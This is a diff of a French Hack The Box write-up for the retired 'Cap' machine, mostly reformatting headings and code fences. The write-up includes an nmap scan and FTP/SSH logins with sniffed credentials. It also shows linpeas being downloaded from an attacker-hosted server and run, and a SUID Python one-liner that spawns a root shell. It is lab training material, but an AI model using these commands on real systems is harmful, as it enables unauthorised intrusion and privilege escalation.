@@ -10,8 +10,10 @@
 
 ```bash
 nmap -Pn -sV nmap.txt 10.10.11.XXX
+```
 ```markdown
 ![Nmap results](../HTB/retired/cap/nmap_cap.png)
+```
 Résultat :
 21/tcp - FTP
 
@@ -39,36 +41,51 @@ Mot de passe FTP
 
 ```markdown
 ![Wireshark](../HTB/retired/cap/cap_wireshark.png)
+```
 
-##Accès FTP & SSH
+## Accès FTP & SSH
 Connexion au serveur FTP :
+```bash
 ftp 10.10.11.XXX
+```
 
 Les identifiants FTP fonctionnent également pour se connecter en SSH :
+```bash
 ssh user@10.10.11.XXX
+```
 Flag user.txt trouvé dans le répertoire home.
 ```markdown
 ![FTP](../HTB/retired/cap/co_ftp.png)
+```
 
 ```markdown
 ![Userflag and linpeas import](../HTB/retired/cap/cap_user_linpeas.png)
+```
 
-##Escalade de privilèges
+## Escalade de privilèges
 Upload de linpeas.sh pour l’analyse locale :
-###Sur la machine attaquante
+### Sur la machine attaquante
+```bash
 python3 -m http.server 8000
+```
 
-###Sur la cible
+### Sur la cible
+```bash
 wget http://<attacker_ip>:8000/linpeas.sh
 chmod +x linpeas.sh
 ./linpeas.sh
+```
 
-##SUID Python trouvé :
+## SUID Python trouvé :
+```bash
 -rwsr-xr-x 1 root root 3700736 Jul  7  2021 /usr/bin/python3.8
+```
 
-##Exploitation SUID Python
+## Exploitation SUID Python
 Lancement de Python avec élévation des privilèges :
+```bash
 /usr/bin/python3.8 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+```
 
 On obtient un shell root, puis :
 cat /root/root.txt
